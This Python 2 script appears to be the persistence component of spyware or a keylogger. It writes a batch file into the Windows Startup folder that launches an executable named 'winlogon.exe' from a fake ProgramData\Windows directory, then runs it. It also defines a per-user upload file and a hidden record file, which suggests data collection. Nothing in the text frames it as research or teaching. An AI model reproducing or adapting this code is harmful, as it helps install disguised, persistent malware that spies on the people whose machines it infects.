import os

PATHS = {'PROGRAM_DATA': os.environ.get('PROGRAMDATA'),
        'USER_NAME': os.environ.get('USERNAME'),
        'STARTUP_PATH': os.environ.get('APPDATA')+'\Microsoft\Windows\Start Menu\Programs\Startup\\',
        'UPLOAD_FILE': os.environ.get('USERNAME').lower()+'.dat',
        'RECORD_FILE': os.environ.get('PROGRAMDATA') + '\Windows\\build\\config.dat'}


if __name__ == '__main__':
    fileh = open(PATHS.get('STARTUP_PATH')+'startup.bat', 'w')
    comm = """@echo off
Start "" "C:\ProgramData\Windows\dist\winlogon.exe" """

    fileh.write(comm)
    fileh.close()

    print os.system('"'+PATHS.get('STARTUP_PATH')+'startup.bat'+'"')
